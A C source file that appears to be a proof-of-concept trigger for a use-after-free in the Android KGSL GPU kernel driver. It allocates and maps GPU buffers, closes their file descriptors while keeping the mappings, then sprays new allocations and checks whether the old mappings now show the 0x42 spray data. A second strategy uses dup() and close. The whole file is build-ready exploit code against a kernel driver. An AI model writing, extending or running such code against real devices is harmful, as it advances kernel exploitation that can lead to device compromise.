/*
 * kgsl_uaf_trigger.c - attempt to trigger a UAF
 *
 * Strategy:
 * 1. Open fd2, allocate memory, mmap, then close fd2
 * 2. Allocate a lot of new memory to try to reuse it
 * 3. Check whether the old mmap was overwritten
 *
 * Build:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_uaf_trigger kgsl_uaf_trigger.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

static sigjmp_buf jmp_env;
static volatile int sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read_u64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    else
    {
        return -1;
    }
}

struct kgsl_gpumem_alloc
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

int main(int argc, char **argv)
{
    printf("=== KGSL UAF Trigger ===\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        printf("[-] Cannot open main fd\n");
        return 1;
    }
    printf("[+] Main fd=%d\n", fd);

    // Strategy 1: use multiple fds
    printf("\n=== Strategy 1: Multiple FD Close ===\n");

    void *dangling_ptrs[10];
    uint64_t markers[10];

    for (int i = 0; i < 10; i++)
    {
        int fd_temp = open("/dev/kgsl-3d0", O_RDWR);
        if (fd_temp < 0)
            continue;

        struct kgsl_gpumem_alloc req = {0};
        req.size = 0x1000;

        if (ioctl(fd_temp, IOCTL_GPUMEM_ALLOC, &req) < 0)
        {
            close(fd_temp);
            continue;
        }

        void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd_temp, req.gpuaddr);
        if (ptr == MAP_FAILED)
        {
            close(fd_temp);
            continue;
        }

        // Write a unique marker
        markers[i] = 0xDEAD0000 + i;
        *(volatile uint64_t *)ptr = markers[i];

        dangling_ptrs[i] = ptr;

        printf("[*] fd%d: gpuaddr=0x%lx, ptr=%p, marker=0x%lx\n",
               i, req.gpuaddr, ptr, markers[i]);

        // Close the fd (but keep the mmap)
        close(fd_temp);
    }

    printf("\n[*] All fds closed, now allocating new memory...\n");

    // Allocate a lot of new memory
    for (int i = 0; i < 1000; i++)
    {
        struct kgsl_gpumem_alloc req = {0};
        req.size = 0x1000;

        if (ioctl(fd, IOCTL_GPUMEM_ALLOC, &req) < 0)
        {
            break;
        }

        void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, req.gpuaddr);
        if (ptr != MAP_FAILED)
        {
            // Fill with new data
            memset(ptr, 0x42, 0x1000);
            munmap(ptr, 0x1000);
        }

        if (i % 100 == 0)
        {
            printf("[*] Allocated %d new buffers\n", i);
        }
    }

    printf("\n[*] Checking dangling pointers...\n");

    for (int i = 0; i < 10; i++)
    {
        if (!dangling_ptrs[i])
            continue;

        uint64_t val;
        if (safe_read_u64(dangling_ptrs[i], &val) == 0)
        {
            if (val == markers[i])
            {
                printf("[*] ptr[%d]: Original marker intact (0x%lx)\n", i, val);
            }
            else if (val == 0x4242424242424242ULL)
            {
                printf("[!!!] ptr[%d]: OVERWRITTEN with 0x42! UAF CONFIRMED!\n", i);
            }
            else
            {
                printf("[!] ptr[%d]: Changed to 0x%lx\n", i, val);
            }
        }
        else
        {
            printf("[!] ptr[%d]: Read crashed (signal %d)\n", i, sig_received);
        }
    }

    // Strategy 2: use dup() and close
    printf("\n=== Strategy 2: dup() and close ===\n");

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    int fd3 = dup(fd2);

    printf("[+] fd2=%d, fd3=%d (dup of fd2)\n", fd2, fd3);

    struct kgsl_gpumem_alloc req = {0};
    req.size = 0x1000;

    if (ioctl(fd2, IOCTL_GPUMEM_ALLOC, &req) == 0)
    {
        printf("[+] Allocated on fd2: 0x%lx\n", req.gpuaddr);

        void *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_SHARED, fd2, req.gpuaddr);
        if (ptr2 != MAP_FAILED)
        {
            *(volatile uint64_t *)ptr2 = 0xBEEFCAFE;
            printf("[+] mmap on fd2: ptr=%p\n", ptr2);

            // Close fd2 while fd3 is still valid
            close(fd2);
            printf("[*] fd2 closed, fd3 still open\n");

            // Try operations through fd3
            struct kgsl_gpumem_alloc req3 = {0};
            req3.size = 0x1000;

            if (ioctl(fd3, IOCTL_GPUMEM_ALLOC, &req3) == 0)
            {
                printf("[+] Allocated on fd3: 0x%lx\n", req3.gpuaddr);
            }

            // Check ptr2
            uint64_t val;
            if (safe_read_u64(ptr2, &val) == 0)
            {
                printf("[*] ptr2 value: 0x%lx\n", val);
            }

            munmap(ptr2, 0x1000);
        }

        close(fd3);
    }

    // Clean up the dangling pointer
    for (int i = 0; i < 10; i++)
    {
        if (dangling_ptrs[i])
        {
            munmap(dangling_ptrs[i], 0x1000);
        }
    }

    close(fd);
    printf("\n[+] Test complete\n");
    return 0;
}
